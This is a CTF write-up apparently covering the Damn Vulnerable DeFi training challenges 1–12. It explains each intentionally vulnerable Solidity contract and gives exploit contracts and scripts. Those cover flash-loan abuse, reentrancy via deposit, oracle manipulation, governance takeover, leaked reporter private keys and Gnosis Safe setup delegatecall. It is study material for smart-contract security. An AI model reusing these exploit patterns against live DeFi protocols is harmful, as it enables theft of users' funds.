```ad-note
title: Challenge #1 - Unstoppable
````ad-info
 There's a lending pool with a million DVT tokens in balance, offering flash loans for free.

If only there was a way to attack and stop the pool from offering flash loans ...

and when we check the source code of the UnstoppableLender.sol there is a storage  **poolBalance** variable that track the deposited amount and  check if it equal  to the contract actual balance ```token.balanceOf(address(this))``` if it is not the same it will revert
so by using erc20 transfer function we can transfer a token in to UnstoppableLender  without updating the poolBalance which make  the require revert and make  the contract to stop offering flash loans
```
```ad-note
title: Challenge #2 - Naive receiver
```ad-info
There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)


the NaiveReceiverLenderPool.flashLoan function take two parameters **borrower** and **borrowerAmount**  and  the borrower parameter is used to send the flashLoan and there is another contract named FlashLoanReceiver and this contract is used to receive flashLoan and it will automatically send   the received amount + FEE  and the the challenged says this account has 10 ETH so to drain all fund from this contract we need to call NaiveReceiverLenderPool.flashLoan 10 times and  setting FlashLoanReveiver.address as the **borrower** we need to call flashLoan 10 times because the fee to flashLoan is 1 ether as the contract have 10 ether 
 **for (let i = 0; i < 10; i++) {
		    await this.pool.flashLoan((FlashLoanReveiver).address, 0);
	    }
    });**
will drain all the funds 
```
```ad-note
title:# Challenge #3 - Truster

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

Currently the pool has 1 million DVT tokens in balance. And you have nothing.

But don't worry, you might be able to take them all from the pool. In a single transaction.
````ad-info
this contract also give a flashLoan  and the goal is to still all the DVT Tokens  and  the flashLoan function accept some parameter 
```  function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data)``` 
the target and data parameter are used to make unsafe external call
```target.functionCall(data);```
so what we need to do is to still all the DVT token from this pool buy doing an external call to do this we need to pass the DVT token address as the target argument and  abi encoded approve  function as the data 
we can use 
	**const ABI = ["function approve(address spender, uint256 amount)"]
	   const iface = new ethers.utils.Interface(ABI);
	   const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
	   await this.pool.flashLoan(1, this.pool.address, this.token.address, data)
	   await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    })**
```
	
```ad-note
title:# Challenge #4 - Side entrance
A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool.

This contract has 3 function 
- deposit 
 -- used to deposit tokens 
- withdraw
 --  used to withdraw
- flashLoan()
 -- to performe flashLoan
 so the issue here is the deposit function  this function is used to deposit ETH so by performing flashloan and  and returning to the contract through the deposit function we can latter withdraw the ETH 
 ```contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address _chal) {
        pool = SideEntranceLenderPool(_chal);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive () external payable {
        owner.transfer(address(this).balance);
    }
}
```
```ad-note
title:Challenge #5 - The rewarder

There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

there is 4 smart contracts 
- AccountingToken(Lp)
  -- A limited  ERC20  Token to keep track of deposits and withdraw  with snapshotting capabilities 
- FlashLoanerPool
 --  A simple pool to get flash loans of DVT
- RewardToken
   --  Reward Token 
- TheRewardPool
 -- A reward pool which used to deposit  DVT token and  give  a rewardToken
 so to get the reward token we first need to deposit DVT token and to do that we can take a flashLoan from FlashLoanerPool after taking a the flashloan we can deposit it to the TheRewardPool.deposit function and this function will mint LP token and call distributeRewards() function 
 what this function do is  first check if the 5 day is over then it will take a snapshot of Lp token  and after that it will mint the reward token based on the pervious snapshot 
 ```uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);
if (amountDeposited > 0 && totalDeposits > 0) {
rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
rewardToken.mint(msg.sender, rewards);
lastRewardTimestamps[msg.sender] = block.timestamp;
}
}
``` 


 - so to get the reward token 
  - take a big DVT  flashloan  -> deposit it to the reward pool (to take a snapshot and mint the reward token to the contract)
  - withdraw the DVT token -> return the flashloan
  - and return the reward token to the msg.sender
  
 ````ad-tip
 title: code 
  function exploit(uint256 amount) external {

pool.flashLoan(amount);

}

function receiveFlashLoan(uint256 amount) external {
liquidityToken.approve(address(rewardPool), amount);
rewardPool.deposit(amount);
rewardPool.withdraw(amount);
liquidityToken.transfer(address(pool), amount);
uint256 Bal = rewardPool.rewardToken().balanceOf(address(this));
rewardPool.rewardToken().transfer(msg.sender, Bal);

}
 
````
```ad-info
title: # Challenge #6 - Selfie

A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

Wow, and it even includes a really fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.
```ad-note
so this challenge have two smart contracts 
- simpleGovernance
 --  This contract is a simple governance  and if you have enough governance token you can  controle the contract 
- SelfiePool
 --this contract provied a flashloan of  the governance token  and there is also another function  drianallFunds  which is only callable by  the governer contract 
 - so if we have enough  gover token to control the gov  smart contract we can  take all the token of this contract
 and we can take a flashloan from this contract
 ````ad-tip
 title: code
 ```  function attack() public {
uint256 MAX = pool.token().balanceOf(address(pool));
pool.flashLoan(MAX);
}
function receiveTokens(address token, uint256 amount) external {
governanceToken.snapshot();
pool.governance().queueAction(
address(pool),
abi.encodeWithSignature("drainAllFunds(address)", msg.sender),
0
);
governanceToken.transfer(address(pool), amount);
}```
```
```ad-info
title:# Challenge #7 - Compromised
While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:

          HTTP/2 200 OK
          content-type: text/html
          content-language: en
          vary: Accept-Encoding
          server: cloudflare

          4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

          4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
        

A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each

This price is fetched from an on-chain oracle, and is based on three trusted reporters: `0xA73209FB1a42495120166736362A1DfA9F95A105`,`0xe92401A4d3af5E446d93D11EEc806b1462b39D15` and `0x81A5D6E50C214044bE44cA0CB057fe119097850c`.

Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.
````ad-tip
there is 3 contract in this challenge 
- Exchange
-- which is used to sell and buy DVNFT
- TrustfulOracleinitilzed
- TrustfulOracle
-  which act as a oracle for the Exchange  and if you are a trusted reporter you can post a price and  2/3 of the reports can change the price as the exchange will take  the median 
after decoding the hex we got a base64  which we can decode again so after we decode  we have
 ``` add1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
  add2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
 it is private key  
 to get the address from the private key we can do
const oracle1 = new ethers.Wallet(add1, ethers.provider);
const oracle2 = new ethers.Wallet(add2, ethers.provider);
console.log(oracle1.address);
console.log(oracle2.address); 
and these address are the reporters address which mean we can change the price of the oracle
```
```ad-tip
so what we  can do is 
-  access the reporter account
- Set median price to something small but > 0
-  Purchase NFT at new low price
-  Set median price to the Exchange contract balance
- Sell  the NFT back to exchange 
```
```ad-info
title:# Challenge #8 - Puppet
There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There's a DVT market opened in an [Uniswap v1 exchange](https://docs.uniswap.org/protocol/V1/introduction), currently with 10 ETH and 10 DVT in liquidity.

Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.
````ad-note
the contract uses calculateDepositRequired(amount) to  get how  much collatteral needed to borrow DVT token
and what calculateDepositRequired do is 
```"amount * (uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);) *2/10**18"```
- so what we can do is all  DVT token  to eth so that the token balance > the ETH balance in the uniswap pool  which will make calculateDepositRequire return  small
- then we can borrow all the DVT from the contract with the ether we have 
```
```ad-info
title: # Challenge #9 - Puppet v2
The developers of the [last lending pool](https://www.damnvulnerabledefi.xyz/challenges/8.html) are saying that they've learned the lesson. And just released a new version!

Now they're using a [Uniswap v2 exchange](https://docs.uniswap.org/protocol/V2/introduction) as a price oracle, along with the recommended utility libraries. That should be enough.

You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)
````ad-tip
 the solution is similar but this one is using uniswapv2 and WETH with some additonal maths 
 - convert our ETH to WETH 
 - swap all the DVT token we have to WETH as uniswapv2 uses WETH
  -- swap 10000 dvt -> WETH
  ratio: 10,100 DVT : 0.09930486593843035 WETH
 - Now let's check how much of a deposit is required for borrowing 1,000,000 DVT
 with the current pool ratio multiplied by 3 due to contract requirements
 1,000,000 DVT = 9.832164944399045 WETH * 3
  and we have 20 WETH +  WETH we get from swapping 10,000 DVT
 - borrow all the dvt with the WETH we have
 - we will have  - 0 ETH
                 - 0 WETH
                 - 1,000,000 DVT
  ```
  ```ad-info
  title: # Challenge #10 - Free rider
A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.

You want to build some rep with this buyer, so you've agreed with the plan.

Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.
```ad-tip
there is two bug in the MarketPlace 
- the first one is we can  buy all the NFT by just 1 nft price as the buyMany function is using msg.value in the loop
- the second one is  the contract transfer  the nft before paying the seller as 
```payable(token.ownerOf(tokenId)).sendValue(priceToPay);```
 which means the contract is paing the buyer as the token.ownerOf is updated before sending the payment 
 - to exploit we only need 15 ether  and we only have 0.5 ether so what we can do is take a flashloan from uniswapv2 
 - first take a flashloan from DVT <-> WETH
 - convert WETH to ETH 
 - call  FreeRiderNFTMarketplace.buymany with 15 ETH
 - transfer the NFT to the buyer each time 
 - after receiving the ether from buyer contract  convert 15 ETH + 0.3 % fee to the uniswapv2 DVT <-> WETH  pool
 ``` 
 ``` 
 function flashSwap(address _tokenBorrow, uint256 _amount) external {
address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
require(pair != address(0), "!pair init");
address token0 = IUniswapV2Pair(pair).token0();
address token1 = IUniswapV2Pair(pair).token1();
uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;
bytes memory data = abi.encode(_tokenBorrow, _amount);
IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
}
function uniswapV2Call(address sender,uint256 amount0,uint256 amount1,bytes calldata data) external override {
address token0 = IUniswapV2Pair(msg.sender).token0();
address token1 = IUniswapV2Pair(msg.sender).token1();
address pair = IUniswapV2Factory(factory).getPair(token0, token1);
require(msg.sender == pair, "!pair");
require(sender == address(this), "!sender");
(address tokenBorrow, uint256 amount) = abi.decode(data,(address, uint256));
uint256 fee = ((amount * 3) / 997) + 1;
uint256 amountToRepay = amount + fee;
uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));
tokenBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", currBal));
uint256[] memory tokenIds = new uint256[](6);
for (uint256 i = 0; i < 6; i++) {
tokenIds[i] = i;
}
FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(tokenIds);
for (uint256 i = 0; i < 6; i++) {
DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);}
(bool success,) = weth.call{value: 15.1 ether}("");
require(success, "failed");
IERC20(tokenBorrow).transfer(pair, amountToRepay);

}```
```
```ad-note
title: # Challenge #11 - Backdoor
To incentivize the creation of more secure wallets in their team, someone has deployed a registry of [Gnosis Safe wallets](https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol). When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

To make sure everything is safe and sound, the registry tightly integrates with the legitimate [Gnosis Safe Proxy Factory](https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol), and has some additional safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Your goal is to take all funds from the registry. In a single transaction.
```ad-tip
resource https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets/

there is only one contract in this challenge WalletRegistry and this contract is A registry for Gnosis Safe wallets  and if you are a beneficiaries creating a wallet it will send you 10 DVT token and  we can create new Gnosis safes with anyone as the owner which means we can create a safe on the behalf of the beneficiraies  During  this  the contract will transfer 10 DVT to the newly created Gnosis safe. However we are can't access it since it is  owned by one of the beneficiaries.  
the wallerRegistry docs says that  the proxyCreated is excuted when it is called via GnosisSafeProxyFactory::createProxyWithCallback
and what this function do is creates a GnossisSafe proxy via the deployProxyWithNonce function  
- If an initializer payload is provided  it calls that on the proxy  and the GnosisSafe.setup function accept to and data parameter and they are passed to Executor.execute function to make a delegateCall into to with a payload data so we can use it to approve all the token for ourself 
- . The factory calls the proxyCreated function on the provided callback _WalletRegistry address.

```function approve(address spender, address token) external {
IERC20(token).approve(spender, type(uint256).max);
}
function attack(address tokenAddress, address hacker, address[] calldata users) public {
for (uint256 i = 0; i < users.length; i++) {
address user = users[i];
address[] memory owners = new address[](1);
owners[0] = user;
bytes memory encodedApprove = abi.encodeWithSignature("approve(address,address)", address(this), tokenAddress);
bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);
GnosisSafeProxy proxy =
proxyFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));
IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);
}
}
```
```ad-note
title: # Challenge #12 - Climber
There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).

The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.

On the vault there's an additional role with powers to sweep all tokens in case of an emergency.

On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.

Your goal is to empty the vault.

we can find 2 smart contract in this challenge 
-ClimberTimelock
-- this contract has a function called execute which violated checks-effects-interation the state is checked after the executing
```for (uint8 i = 0; i < targets.length; i++) {
targets[i].functionCallWithValue(dataElements[i], values[i]);
}
require(getOperationState(id) == OperationState.ReadyForExecution);
```
```ad-note
so what we can do is 
- Set the grant ourselve  PROPOSER role.
- Update delay of schedule execution to 0 
- Call to Vault contract to upgrade the  contract
- which allows setting the sweeper to anyone.
-  Call to another attacker controlled contract to handle the scheduling and sweeping
```
